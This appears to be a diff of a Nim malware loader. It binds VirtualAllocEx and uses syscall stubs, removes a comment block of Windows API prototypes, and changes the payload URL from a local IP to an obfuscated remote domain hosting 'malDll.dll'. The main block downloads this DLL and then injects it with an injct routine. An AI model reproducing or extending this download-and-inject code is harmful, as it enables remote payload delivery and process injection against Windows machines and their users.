@@ -7,35 +7,6 @@ import ptr_math
 import GetSyscallStub
 import osproc
 
-#[BOOL VirtualProtect(
-  [in]  LPVOID lpAddress,
-  [in]  SIZE_T dwSize,
-  [in]  DWORD  flNewProtect,
-  [out] PDWORD lpflOldProtect
-);
-LPVOID VirtualAlloc(
-  [in, optional] LPVOID lpAddress,
-  [in]           SIZE_T dwSize,
-  [in]           DWORD  flAllocationType,
-  [in]           DWORD  flProtect
-);
-
-LPVOID VirtualAllocEx(
-  [in]           HANDLE hProcess,
-  [in, optional] LPVOID lpAddress,
-  [in]           SIZE_T dwSize,
-  [in]           DWORD  flAllocationType,
-  [in]           DWORD  flProtect
-);
-
-HANDLE OpenProcess(
-  [in] DWORD dwDesiredAccess,
-  [in] BOOL  bInheritHandle,
-  [in] DWORD dwProcessId
-);
-
-]#
-
 proc VirtAEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID
   {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualAllocEx".}
 
@@ -184,6 +155,6 @@ proc dwnld(url: string): bool =
 when defined(windows):
     when defined(amd64):
         when isMainModule:
-            if dwnld("http://192.168.0.127:8000/malDll.dll"):
+            if dwnld("http://hjudhsfauifbhjdbashgfbuiwegfbd6746789.net/malDll.dll"):
                 injct("malDll.dll")
                 var pauseEx = readLine(stdin)
